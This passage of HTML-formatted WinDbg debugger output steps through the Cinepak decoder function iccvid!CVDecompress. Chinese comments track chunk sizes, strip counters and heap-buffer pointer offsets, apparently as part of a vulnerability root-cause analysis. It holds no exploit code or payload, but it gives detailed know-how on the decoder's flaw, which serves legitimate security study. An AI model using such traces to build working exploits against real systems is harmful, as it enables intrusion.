(73b723f8)[<span class="built_in">eax</span>*<span class="number">4</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:73b723f8=73b72327 <span class="comment">; jump table for switch statement</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72327 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x179</span>:</span><br><span class="line">73b72327 ff7330          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">30h</span>]  <span class="built_in">ds</span>:<span class="number">0023</span>:001535e0=<span class="number">00000000</span> <span class="comment">; arg4,ebx = a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b7232a <span class="built_in">esp</span>=025afd00 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x17c</span>: </span><br><span class="line">73b7232a ff7334          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">34h</span>]  <span class="built_in">ds</span>:<span class="number">0023</span>:001535e4=001595f8 <span class="comment">; arg3,ebx = a1 = 0x001535b0,0x001595f8为堆块数据区域尾指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b7232d <span class="built_in">esp</span>=025afcfc <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x17f</span>:</span><br><span class="line">73b7232d ff7338          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">38h</span>]  <span class="built_in">ds</span>:<span class="number">0023</span>:001535e8=001535f8 <span class="comment">; arg2,ebx = a1 = 0x001535b0,0x001535f8为堆块数据区域首指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72330 <span class="built_in">esp</span>=025afcf8 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x182</span>:</span><br><span class="line">73b72330 <span class="number">57</span>              <span class="keyword">push</span>    <span class="built_in">edi</span>                                            <span class="comment">; arg1,edi = 0x00ba690e,指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72331 <span class="built_in">esp</span>=025afcf4 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x183</span>:</span><br><span class="line">73b72331 ff13            <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>]      <span class="built_in">ds</span>:<span class="number">0023</span>:001535b0=&#123;iccvid!ExpandCodeBook32 (73b79f3b)&#125; <span class="comment">; 展开Codebooks</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72333 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x185</span>:</span><br><span class="line">73b72333 eb61            <span class="keyword">jmp</span>     iccvid!CVDecompress+<span class="number">0x1e8</span> (73b72396)           <span class="comment">; switch代码块之后的代码块</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72396 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1e8</span>:</span><br><span class="line">73b72396 8b55e0          <span class="keyword">mov</span>     <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">20h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd10=<span class="number">00000000</span> <span class="comment">; edx = [ebp-20h] = 0x00000000,Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72399 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1eb</span>:</span><br><span class="line">73b72399 8b4de8          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba690e <span class="comment">; ecx = [ebp-18h] = 0x00ba690e,指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b7239c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1ee</span>:</span><br><span class="line">73b7239c 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = eax^eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b7239e <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1f0</span>:</span><br><span class="line">73b7239e 03ca            <span class="keyword">add</span>     <span class="built_in">ecx</span>,<span class="built_in">edx</span>                                        <span class="comment">; ecx指向第1个CVID Chunk ID,edx为Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723a0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1f2</span>:</span><br><span class="line">73b723a0 <span class="number">40</span>              <span class="keyword">inc</span>     <span class="built_in">eax</span>                                            <span class="comment">; eax = eax+1 = 0x1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723a1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1f3</span>:</span><br><span class="line">73b723a1 03fa            <span class="keyword">add</span>     <span class="built_in">edi</span>,<span class="built_in">edx</span>                                        <span class="comment">; edi指向第1个CVID Chunk ID,edx为Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723a3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1f5</span>:</span><br><span class="line">73b723a3 3bd0            <span class="keyword">cmp</span>     <span class="built_in">edx</span>,<span class="built_in">eax</span>                                        <span class="comment">; edx为Size of chunk data,判断其是否大于1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723a5 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1f7</span>:</span><br><span class="line">73b723a5 894de8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba690e <span class="comment">; ecx指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723a8 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1fa</span>:</span><br><span class="line">73b723a8 <span class="number">7602</span>            <span class="keyword">jbe</span>     iccvid!CVDecompress+<span class="number">0x1fe</span> (73b723ac)    [br=<span class="number">1</span>] <span class="comment">; 小于等于则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723ac <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1fe</span>:</span><br><span class="line">73b723ac <span class="number">294508</span>          <span class="keyword">sub</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000004</span> <span class="comment">; </span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723af <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x201</span>:</span><br><span class="line">73b723af 837d0804        <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="number">4</span>  <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000003</span> <span class="comment">; 判断(Size of strip data减去Strip Header大小后的数据大小-Size of chunk data)是否大于等于4</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723b3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x205</span>:</span><br><span class="line">73b723b3 0f8338ffffff    <span class="keyword">jae</span>     iccvid!CVDecompress+<span class="number">0x143</span> (73b722f1)    [br=<span class="number">0</span>] <span class="comment">; 大于等于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723b9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x20b</span>:</span><br><span class="line">73b723b9 0fbf450c        <span class="keyword">movsx</span>   <span class="built_in">eax</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]   <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=<span class="number">0060</span> <span class="comment">; eax = a2 = 0x60 = (Strips bottom Y position)-(Strips top Y position)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723bd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x20f</span>:</span><br><span class="line">73b723bd 0faf4520        <span class="keyword">imul</span>    <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">20h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd50=<span class="number">00000540</span> <span class="comment">; [(Strips bottom Y position)-(Strips top Y position)]*a7</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0001f800 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723c1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x213</span>:</span><br><span class="line">73b723c1 01451c          <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">1Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd4c=<span class="number">02310050</span> <span class="comment">; [(Strips bottom Y position)-(Strips top Y position)]*a7+a6</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0001f800 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723c4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x216</span>:</span><br><span class="line">73b723c4 ff45ec          <span class="keyword">inc</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:025afd1c=<span class="number">00000000</span> <span class="comment">; [ebp-14h]++,coded strip计数器</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0001f800 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723c7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x219</span>:</span><br><span class="line">73b723c7 8145fc00200000  <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">2000h</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00000000</span> <span class="comment">; [ebp-4] = [ebp-4]+0x2000 = 0+0x2000 = 0x2000,堆缓冲区指针偏移</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0001f800 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723ce <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span 